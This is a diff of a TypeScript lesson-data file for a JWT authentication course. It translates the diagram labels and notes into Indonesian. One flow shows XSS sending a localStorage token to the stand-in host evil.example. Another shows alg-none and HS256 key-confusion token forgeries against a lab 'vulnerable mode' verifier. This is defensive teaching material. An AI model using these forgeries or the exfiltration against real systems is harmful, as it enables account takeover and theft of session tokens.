@@ -24,130 +24,130 @@ const loginReq = `POST /login HTTP/1.1\n${HOST}\n${JSON_HDR}\n\n{"email":"alice@
 
 const statefulVsStateless: Flow = {
   id: "statefulVsStateless",
-  title: "A self-contained token: the API verifies it without a database lookup",
+  title: "Token self-contained: API memverifikasinya tanpa lookup ke database",
   actors: [
     { id: "browser", label: "Browser", kind: "browser" },
     { id: "api", label: "API", kind: "api" },
   ],
   steps: [
-    { from: "browser", to: "api", label: "POST /login", http: loginReq, note: "Authentication happens once, exactly like in Module 1." },
+    { from: "browser", to: "api", label: "POST /login", http: loginReq, note: "Authentication terjadi sekali saja, persis seperti di Module 1." },
     { from: "api", to: "browser", label: "200 + access token", http: `HTTP/1.1 200 OK
 ${JSON_HDR}
 Cache-Control: no-store
 
-${tokenBody(ACCESS)}`, note: "The reply carries a signed JWT. Claims such as who the user is and when the token expires travel inside it. A refresh cookie joins it in lesson 3." },
-    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Every later call presents the token in the Authorization header. Nothing is stored on the server for it." },
-    { from: "api", to: "api", label: "verify signature + claims", note: "The API checks the signature with its key and reads iss, aud and exp from the token itself. No session table, no database round trip." },
-    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "The price of this design: the server cannot take the token back before it expires. Lesson 6 is about that." },
+${tokenBody(ACCESS)}`, note: "Response membawa JWT yang di-sign. Claims seperti siapa user-nya dan kapan token expired ikut di dalamnya. Refresh cookie menyusul di lesson 3." },
+    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Setiap call berikutnya menyodorkan token di header Authorization. Nggak ada yang disimpan di server untuknya." },
+    { from: "api", to: "api", label: "verifikasi signature + claims", note: "API mengecek signature dengan key-nya dan membaca iss, aud, dan exp dari token itu sendiri. Nggak ada tabel session, nggak ada bolak-balik ke database." },
+    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "Harga dari desain ini: server nggak bisa menarik kembali token sebelum expired. Lesson 6 membahas hal itu." },
   ],
 };
 
 const jwksVerify: Flow = {
   id: "jwksVerify",
-  title: "Verifying with a public key published as a JWKS",
+  title: "Verifikasi dengan public key yang dipublikasikan sebagai JWKS",
   actors: [
     { id: "browser", label: "Client", kind: "browser" },
     { id: "api", label: "API", kind: "api" },
     { id: "as", label: "Auth server", kind: "as" },
   ],
   steps: [
-    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "The token header says alg RS256 and kid k3Hq9ZmB1vW8eYrT: which key signed it." },
-    { from: "api", to: "as", label: "GET /.well-known/jwks.json", http: `GET /.well-known/jwks.json HTTP/1.1\n${HOST}`, note: "The API does not have the key yet, so it asks the issuer for its public keys. In the lab one process plays both roles." },
+    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Header token menyebut alg RS256 dan kid k3Hq9ZmB1vW8eYrT: itulah key yang men-sign-nya." },
+    { from: "api", to: "as", label: "GET /.well-known/jwks.json", http: `GET /.well-known/jwks.json HTTP/1.1\n${HOST}`, note: "API belum punya key-nya, jadi dia meminta public key ke issuer. Di lab, satu proses memerankan keduanya." },
     {
       from: "as",
       to: "api",
       label: "200 JWKS",
       http: `HTTP/1.1 200 OK\n${JSON_HDR}\n\n{"keys":[{"kty":"RSA","n":"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw","e":"AQAB","kid":"k3Hq9ZmB1vW8eYrT","alg":"RS256","use":"sig"}]}`,
-      note: "A JWK Set: public keys only, each with a kid. The modulus n is an example value here. Anyone may fetch this document, and it is safe because a public key cannot sign.",
+      note: "JWK Set: hanya public key, masing-masing dengan kid. Modulus n di sini cuma contoh. Siapa pun boleh mengambil dokumen ini, dan aman karena public key nggak bisa men-sign.",
     },
-    { from: "api", to: "api", label: "pick key by kid, verify RS256", note: "kid selects the key. The API pins the algorithm to RS256 itself and never lets the token choose. Then it checks iss, aud and exp." },
-    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "The API now caches the JWKS and refetches only when it meets an unknown kid. That is how a key rotation reaches every verifier." },
+    { from: "api", to: "api", label: "pilih key berdasarkan kid, verifikasi RS256", note: "kid memilih key-nya. API mem-pin algoritma ke RS256 sendiri dan nggak pernah membiarkan token memilih. Lalu dia mengecek iss, aud, dan exp." },
+    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "API sekarang meng-cache JWKS dan hanya mengambil ulang saat ketemu kid asing. Begitulah key rotation sampai ke setiap verifier." },
   ],
 };
 
 const refreshRotation: Flow = {
   id: "refreshRotation",
-  title: "Refresh token rotation, and what happens when an old one comes back",
+  title: "Refresh token rotation, dan apa yang terjadi kalau token lama muncul lagi",
   actors: [
     { id: "browser", label: "Browser", kind: "browser" },
     { id: "server", label: "Server", kind: "server" },
     { id: "db", label: "Database", kind: "db" },
-    { id: "attacker", label: "Thief", kind: "attacker" },
+    { id: "attacker", label: "Pencuri", kind: "attacker" },
   ],
   steps: [
-    { from: "browser", to: "server", label: "POST /login", http: loginReq, note: "Authentication, once." },
-    { from: "server", to: "db", label: "INSERT refresh token (new family)", note: "A fresh 32-byte random refresh token starts a family. Only its sha256 is stored. It is opaque: not a JWT, so the server can revoke it." },
-    { from: "server", to: "browser", label: "200 + access token + rt cookie", http: loginOk(ACCESS, RT1), note: "A 5-minute access token in the body, and the refresh token in an HttpOnly cookie that is only sent to /refresh." },
-    { from: "browser", to: "server", label: "GET /api/profile (token expired)", http: profile(EXPIRED), note: "Five minutes later the access token has expired." },
-    { from: "server", to: "browser", label: "401 invalid_token", http: invalid401, note: "The client knows what to do next: ask for a new access token." },
-    { from: "browser", to: "server", label: "POST /refresh", http: refreshReq(RT1), note: "The browser attaches the rt cookie by itself. The page's JavaScript never sees it." },
-    { from: "server", to: "db", label: "retire rt1, insert rt2", note: "In one transaction: mark rt1 as used and store its successor in the same family. The row is locked, so two concurrent refreshes cannot both win." },
-    { from: "server", to: "browser", label: "200 + new access + new rt", http: loginOk(ACCESS2, RT2), note: "A new access token and a new refresh cookie. rt1 is now spent." },
-    { from: "attacker", to: "server", label: "POST /refresh (stolen rt1)", http: refreshReq(RT1), note: "Later, someone replays the old refresh token they copied.", danger: true },
-    { from: "server", to: "db", label: "rt1 already used: revoke the family", note: "REUSE DETECTION. A spent token coming back means it was copied, so the whole family is revoked, rt2 included." },
-    { from: "server", to: "attacker", label: "401", http: refresh401, note: "The thief gets nothing. The victim's next refresh fails too, so they log in again, and that is the alarm." },
+    { from: "browser", to: "server", label: "POST /login", http: loginReq, note: "Authentication, sekali saja." },
+    { from: "server", to: "db", label: "INSERT refresh token (family baru)", note: "Refresh token acak 32 byte yang baru memulai sebuah family. Hanya sha256-nya yang disimpan. Dia opaque: bukan JWT, jadi server bisa me-revoke-nya." },
+    { from: "server", to: "browser", label: "200 + access token + rt cookie", http: loginOk(ACCESS, RT1), note: "Access token 5 menit di body, dan refresh token di cookie HttpOnly yang hanya dikirim ke /refresh." },
+    { from: "browser", to: "server", label: "GET /api/profile (token expired)", http: profile(EXPIRED), note: "Lima menit kemudian access token sudah expired." },
+    { from: "server", to: "browser", label: "401 invalid_token", http: invalid401, note: "Client tahu langkah berikutnya: minta access token baru." },
+    { from: "browser", to: "server", label: "POST /refresh", http: refreshReq(RT1), note: "Browser menyertakan cookie rt sendiri. JavaScript halaman nggak pernah melihatnya." },
+    { from: "server", to: "db", label: "pensiunkan rt1, insert rt2", note: "Dalam satu transaksi: tandai rt1 sudah dipakai dan simpan penggantinya di family yang sama. Barisnya di-lock, jadi dua refresh bersamaan nggak bisa sama-sama menang." },
+    { from: "server", to: "browser", label: "200 + access baru + rt baru", http: loginOk(ACCESS2, RT2), note: "Access token baru dan refresh cookie baru. rt1 sekarang sudah terpakai." },
+    { from: "attacker", to: "server", label: "POST /refresh (rt1 curian)", http: refreshReq(RT1), note: "Belakangan, seseorang memutar ulang refresh token lama yang dia salin.", danger: true },
+    { from: "server", to: "db", label: "rt1 sudah dipakai: revoke family", note: "REUSE DETECTION. Token terpakai yang muncul lagi berarti sudah disalin, jadi seluruh family di-revoke, termasuk rt2." },
+    { from: "server", to: "attacker", label: "401", http: refresh401, note: "Si pencuri nggak dapat apa-apa. Refresh berikutnya dari korban juga gagal, jadi dia login ulang, dan itulah alarmnya." },
   ],
 };
 
 const xssTheft: Flow = {
   id: "xssTheft",
-  title: "XSS against a token in localStorage, and against an HttpOnly cookie",
+  title: "XSS terhadap token di localStorage, dan terhadap cookie HttpOnly",
   actors: [
-    { id: "browser", label: "Victim's page", kind: "browser" },
+    { id: "browser", label: "Halaman korban", kind: "browser" },
     { id: "attacker", label: "Attacker", kind: "attacker" },
     { id: "server", label: "API", kind: "api" },
   ],
   steps: [
-    { from: "attacker", to: "browser", label: "inject <script>", note: "A comment field, a dependency or an ad lets the attacker's script run in your page, with your origin's full privileges.", danger: true },
-    { from: "browser", to: "browser", label: "localStorage.getItem('access_token')", note: "Any script on the origin can read localStorage and sessionStorage. The token is right there.", danger: true },
-    { from: "browser", to: "attacker", label: "POST evil.example/steal", http: `POST /steal HTTP/1.1\nHost: evil.example\n${JSON_HDR}\n\n{"t":"${ACCESS.slice(0, 40)}…"}`, note: "The script sends the token to the attacker's server.", danger: true },
-    { from: "attacker", to: "server", label: "GET /api/profile", http: profile(ACCESS), note: "The attacker replays the token from their own machine. A JWT is a bearer token, so the server cannot tell this apart from the victim.", danger: true },
-    { from: "server", to: "attacker", label: "200 (until exp)", http: profileOk, note: "It works until the token expires. A short lifetime limits the loss." },
-    { from: "browser", to: "browser", label: "document.cookie", note: "Now the HttpOnly rt cookie: document.cookie does not list it, so the script has nothing to read and send." },
-    { from: "browser", to: "server", label: "POST /refresh (from the page)", http: refreshReq("(sent by the browser, invisible to the script)"), note: "Honest part: while the page is open the script can still call /refresh and the browser attaches the cookie. It gets a fresh access token, which it could send out too (usable only until exp), but never the refresh token itself.", danger: true },
+    { from: "attacker", to: "browser", label: "inject <script>", note: "Kolom komentar, dependency, atau iklan membuat script attacker jalan di halaman kamu, dengan hak akses penuh origin kamu.", danger: true },
+    { from: "browser", to: "browser", label: "localStorage.getItem('access_token')", note: "Script apa pun di origin bisa membaca localStorage dan sessionStorage. Token-nya ada di situ.", danger: true },
+    { from: "browser", to: "attacker", label: "POST evil.example/steal", http: `POST /steal HTTP/1.1\nHost: evil.example\n${JSON_HDR}\n\n{"t":"${ACCESS.slice(0, 40)}…"}`, note: "Script mengirim token ke server milik attacker.", danger: true },
+    { from: "attacker", to: "server", label: "GET /api/profile", http: profile(ACCESS), note: "Attacker memutar ulang token dari mesinnya sendiri. JWT adalah bearer token, jadi server nggak bisa membedakannya dari korban.", danger: true },
+    { from: "server", to: "attacker", label: "200 (sampai exp)", http: profileOk, note: "Berhasil sampai token expired. Umur yang pendek membatasi kerugian." },
+    { from: "browser", to: "browser", label: "document.cookie", note: "Sekarang cookie rt yang HttpOnly: document.cookie nggak menampilkannya, jadi script nggak punya apa-apa untuk dibaca dan dikirim." },
+    { from: "browser", to: "server", label: "POST /refresh (dari halaman)", http: refreshReq("(sent by the browser, invisible to the script)"), note: "Bagian jujurnya: selama halaman terbuka, script tetap bisa memanggil /refresh dan browser menyertakan cookie-nya. Dia mendapat access token baru, yang bisa dikirim keluar juga (hanya berlaku sampai exp), tapi nggak pernah refresh token-nya sendiri.", danger: true },
   ],
 };
 
 const algNone: Flow = {
   id: "algNone",
-  title: "Forged tokens against a verifier that trusts the token's own header",
+  title: "Token palsu melawan verifier yang mempercayai header milik token itu sendiri",
   actors: [
     { id: "attacker", label: "Attacker", kind: "attacker" },
     { id: "server", label: "API", kind: "api" },
   ],
   steps: [
-    { from: "attacker", to: "attacker", label: "craft header + payload", note: "Header {\"typ\":\"JWT\",\"alg\":\"none\"}, payload claiming sub forged-user, and an empty signature. No key is needed.", danger: true },
-    { from: "attacker", to: "server", label: "GET /api/profile (vulnerable mode)", http: `${profile(NONE)}\nX-Lab-Mode: vulnerable`, note: "The token ends in a dot with nothing after it: an unsigned JWT.", danger: true },
-    { from: "server", to: "server", label: "naive verifier reads alg from the token", note: "FLAW 1 and 2. It trusts the attacker-supplied alg header, sees none, and skips signature verification.", danger: true },
-    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"forged-user","email":"forged@example.com"}`, note: "The API accepted a token nobody signed.", danger: true },
-    { from: "attacker", to: "server", label: "same token, secure mode", http: profile(NONE), note: "Now the identical token against the default, secure verifier." },
-    { from: "server", to: "attacker", label: "401 invalid_token", http: invalid401, note: "The secure verifier pins RS256, so alg none is rejected before any claim is looked at. It also answers with a RFC 6750 WWW-Authenticate header." },
-    { from: "attacker", to: "server", label: "key confusion: HS256 signed with the public key", http: `${profile(HS)}
-X-Lab-Mode: vulnerable`, note: "A second forgery. alg HS256, and an HMAC computed with the server's own public key text as the secret. Anyone can fetch that key.", danger: true },
+    { from: "attacker", to: "attacker", label: "racik header + payload", note: "Header {\"typ\":\"JWT\",\"alg\":\"none\"}, payload yang mengaku sub forged-user, dan signature kosong. Nggak butuh key.", danger: true },
+    { from: "attacker", to: "server", label: "GET /api/profile (vulnerable mode)", http: `${profile(NONE)}\nX-Lab-Mode: vulnerable`, note: "Token berakhir dengan titik tanpa apa pun setelahnya: JWT tanpa signature.", danger: true },
+    { from: "server", to: "server", label: "verifier naif membaca alg dari token", note: "FLAW 1 dan 2. Dia mempercayai header alg dari attacker, melihat none, lalu melewatkan verifikasi signature.", danger: true },
+    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"forged-user","email":"forged@example.com"}`, note: "API menerima token yang nggak di-sign siapa pun.", danger: true },
+    { from: "attacker", to: "server", label: "token yang sama, mode secure", http: profile(NONE), note: "Sekarang token yang identik melawan verifier default yang aman." },
+    { from: "server", to: "attacker", label: "401 invalid_token", http: invalid401, note: "Verifier yang aman mem-pin RS256, jadi alg none ditolak sebelum claim apa pun dilihat. Dia juga membalas dengan header WWW-Authenticate sesuai RFC 6750." },
+    { from: "attacker", to: "server", label: "key confusion: HS256 di-sign dengan public key", http: `${profile(HS)}
+X-Lab-Mode: vulnerable`, note: "Pemalsuan kedua. alg HS256, dengan HMAC yang dihitung memakai teks public key milik server sendiri sebagai secret. Siapa pun bisa mengambil key itu.", danger: true },
     { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK
 ${JSON_HDR}
 Cache-Control: no-store
 
-{"sub":"forged-user","email":"forged@example.com"}`, note: "The naive verifier switched to HMAC because the header said so, and used the public key as the secret. The secure verifier answers 401 here too: it only ever accepts RS256.", danger: true },
+{"sub":"forged-user","email":"forged@example.com"}`, note: "Verifier naif beralih ke HMAC karena header-nya bilang begitu, dan memakai public key sebagai secret. Verifier yang aman juga membalas 401 di sini: dia hanya menerima RS256.", danger: true },
   ],
 };
 
 const revocation: Flow = {
   id: "revocation",
-  title: "Logout revokes the refresh family, but the access token lives on until exp",
+  title: "Logout me-revoke refresh family, tapi access token tetap hidup sampai exp",
   actors: [
     { id: "browser", label: "Browser", kind: "browser" },
     { id: "server", label: "Server", kind: "server" },
     { id: "db", label: "Database", kind: "db" },
   ],
   steps: [
-    { from: "browser", to: "server", label: "POST /refresh/logout", http: `POST /refresh/logout HTTP/1.1\n${HOST}\nCookie: rt=${RT2}`, note: "Logout lives under /refresh because the rt cookie is only sent to that path." },
-    { from: "server", to: "db", label: "revoke the family", note: "Every token in the family, used or not, gets revoked_at. Only the hash was ever stored." },
-    { from: "server", to: "browser", label: "204 + clear cookie", http: "HTTP/1.1 204 No Content\nSet-Cookie: rt=; Path=/refresh; Max-Age=0; HttpOnly; SameSite=Strict", note: "The cookie is deleted in the browser as well." },
-    { from: "browser", to: "server", label: "POST /refresh (same rt)", http: refreshReq(RT2), note: "Anyone who kept a copy of the refresh token tries it." },
-    { from: "server", to: "browser", label: "401", http: refresh401, note: "Revoked. This is the revocation you can enforce: refresh requires a database check." },
-    { from: "browser", to: "server", label: "GET /api/profile (access token, 2 min left)", http: profile(ACCESS2), note: "But the access token was already issued and is verified offline." },
-    { from: "server", to: "browser", label: "200 until exp", http: profileOk, note: "No lookup means no revocation: the token stays valid until exp, at most 5 minutes here. That is the trade-off behind short lifetimes.", danger: true },
+    { from: "browser", to: "server", label: "POST /refresh/logout", http: `POST /refresh/logout HTTP/1.1\n${HOST}\nCookie: rt=${RT2}`, note: "Logout ada di bawah /refresh karena cookie rt hanya dikirim ke path itu." },
+    { from: "server", to: "db", label: "revoke family", note: "Setiap token di family, sudah dipakai atau belum, mendapat revoked_at. Yang pernah disimpan hanya hash-nya." },
+    { from: "server", to: "browser", label: "204 + hapus cookie", http: "HTTP/1.1 204 No Content\nSet-Cookie: rt=; Path=/refresh; Max-Age=0; HttpOnly; SameSite=Strict", note: "Cookie dihapus juga di browser." },
+    { from: "browser", to: "server", label: "POST /refresh (rt yang sama)", http: refreshReq(RT2), note: "Siapa pun yang menyimpan salinan refresh token mencobanya." },
+    { from: "server", to: "browser", label: "401", http: refresh401, note: "Di-revoke. Inilah revoke yang bisa kamu tegakkan: refresh butuh pengecekan ke database." },
+    { from: "browser", to: "server", label: "GET /api/profile (access token, sisa 2 menit)", http: profile(ACCESS2), note: "Tapi access token sudah terlanjur diterbitkan dan diverifikasi secara offline." },
+    { from: "server", to: "browser", label: "200 sampai exp", http: profileOk, note: "Tanpa lookup berarti tanpa revoke: token tetap valid sampai exp, paling lama 5 menit di sini. Itulah trade-off di balik umur yang pendek.", danger: true },
   ],
 };
 
